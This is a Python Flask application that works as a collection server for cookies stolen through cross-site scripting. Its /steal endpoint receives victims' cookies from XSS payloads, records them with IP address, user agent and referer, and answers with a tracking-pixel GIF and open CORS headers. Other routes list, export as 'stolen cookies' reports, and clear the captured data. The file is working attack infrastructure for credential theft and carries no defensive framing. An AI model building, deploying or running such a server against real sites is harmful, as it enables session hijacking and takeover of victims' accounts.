from flask import Flask, request, jsonify, render_template
from datetime import datetime
import json

app = Flask(__name__)

stolen_cookies = []

SERVER_START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


@app.route('/')
def index():
    """Display all stolen cookies"""
    return render_template(
        'index.html',
        cookies=reversed(stolen_cookies),
        total=len(stolen_cookies),
        server_start=SERVER_START_TIME
    )


@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """
    Endpoint that receives stolen cookies from XSS payloads
    Accepts both GET and POST requests
    """
    cookie_data = None
    
    if request.method == 'GET':
        cookie_data = request.args.get('cookie') or request.args.get('c')
    elif request.method == 'POST':
        cookie_data = request.form.get('cookie') or request.json.get('cookie') if request.is_json else None
    
    if not cookie_data:
        cookie_data = request.args.get('data') or str(dict(request.args))

    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'cookie': cookie_data or 'No cookie data',
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer'),
        'method': request.method
    }
    
    stolen_cookies.append(entry)

    print(f"\n{'='*60}")
    print(f"[ALERT] NEW STOLEN COOKIE RECEIVED")
    print(f"{'='*60}")
    print(f"Timestamp: {entry['timestamp']}")
    print(f"Cookie: {entry['cookie']}")
    print(f"IP: {entry['ip']}")
    print(f"User-Agent: {entry['user_agent']}")
    print(f"Referer: {entry['referer']}")
    print(f"Method: {entry['method']}")
    print(f"{'='*60}\n")
    
    return ('GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
            '\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
            '\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'), 200, {
        'Content-Type': 'image/gif',
        'Access-Control-Allow-Origin': '*'
    }


@app.route('/api/cookies', methods=['GET'])
def api_get_cookies():
    """API endpoint to retrieve stolen cookies as JSON"""
    return jsonify({
        'total': len(stolen_cookies),
        'cookies': stolen_cookies
    })


@app.route('/clear', methods=['POST'])
def clear_cookies():
    """Clear all stolen cookies"""
    global stolen_cookies
    stolen_cookies = []
    print("\n[INFO] All stolen cookies cleared\n")
    return jsonify({'status': 'cleared'})


@app.route('/download/<format>', methods=['GET'])
def download_cookies(format):
    """Download stolen cookies in specified format (json or txt)"""
    from flask import Response
    
    if format == 'json':
        # Export as JSON
        json_data = json.dumps({
            'server_start': SERVER_START_TIME,
            'total_cookies': len(stolen_cookies),
            'cookies': stolen_cookies
        }, indent=2, ensure_ascii=False)
        
        return Response(
            json_data,
            mimetype='application/json',
            headers={
                'Content-Disposition': f'attachment; filename=stolen_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
            }
        )
    
    elif format == 'txt':
        # Export as TXT
        txt_lines = []
        txt_lines.append("="*70)
        txt_lines.append("STOLEN COOKIES REPORT")
        txt_lines.append("="*70)
        txt_lines.append(f"Server Start Time: {SERVER_START_TIME}")
        txt_lines.append(f"Total Cookies Stolen: {len(stolen_cookies)}")
        txt_lines.append(f"Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        txt_lines.append("="*70)
        txt_lines.append("")
        
        for idx, entry in enumerate(stolen_cookies, 1):
            txt_lines.append(f"\n[{idx}] Cookie Entry")
            txt_lines.append("-"*70)
            txt_lines.append(f"Timestamp: {entry['timestamp']}")
            txt_lines.append(f"Cookie: {entry['cookie']}")
            txt_lines.append(f"IP Address: {entry['ip']}")
            txt_lines.append(f"User-Agent: {entry['user_agent']}")
            txt_lines.append(f"Referer: {entry.get('referer', 'N/A')}")
            txt_lines.append(f"Method: {entry['method']}")
            txt_lines.append("-"*70)
        
        txt_content = "\n".join(txt_lines)
        
        return Response(
            txt_content,
            mimetype='text/plain',
            headers={
                'Content-Disposition': f'attachment; filename=stolen_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
            }
        )
    
    else:
        return jsonify({'error': 'Invalid format. Use json or txt'}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
